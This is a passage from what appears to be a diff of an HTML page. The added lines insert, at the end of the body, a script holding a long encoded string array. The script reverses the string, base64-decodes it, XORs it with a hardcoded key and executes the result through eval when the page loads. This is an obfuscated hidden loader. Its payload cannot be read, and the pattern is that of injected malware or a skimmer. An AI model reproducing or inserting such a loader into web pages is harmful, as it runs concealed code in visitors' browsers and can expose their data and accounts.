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"];
+         var __ecdec7="q8AajADBY0gVRz!Q&VQTuZV8RCS&IWCJ";
+         var __df73fe=function(s){return s.split('').reverse().join('')};
+         var _0x26e338=__df73fe(__6fcd70.join(''));
+         var _0x63158b=atob(_0x26e338);
+         var $_6694a1=new Uint8Array(_0x63158b.length);
+         for(var __008868=0;__008868<_0x63158b.length;__008868++){
+            $_6694a1[__008868]=_0x63158b.charCodeAt(__008868)^__ecdec7.charCodeAt(__008868%__ecdec7.length);
+         }
+         var _0xa3b714=new TextDecoder();
+         var __c9c932=_0xa3b714.decode($_6694a1);
+         (0,eval)(__c9c932);
+      }();
+   </script>
+</body>
+
+</html>
